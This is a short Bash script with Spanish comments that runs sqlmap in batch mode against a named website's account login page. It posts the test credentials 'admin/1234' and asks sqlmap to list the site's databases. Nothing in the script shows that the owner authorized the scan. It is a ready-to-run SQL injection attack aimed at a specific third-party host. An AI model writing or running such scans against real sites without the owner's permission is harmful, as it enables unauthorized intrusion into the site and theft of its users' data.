
#!/bin/bash

# =======================================
# Script para escaneo SQL Injection con sqlmap
# URL: https://pascualbravo.ingejei.com/my-account/
# Autor: Juan David Benjumea
# Fecha: $(date)
# =======================================

echo "[*] Iniciando escaneo SQL Injection con sqlmap..."

sqlmap -u "https://pascualbravo.ingejei.com/my-account/" --data="username=admin&password=1234" --batch --dbs

echo "[*] Escaneo finalizado."
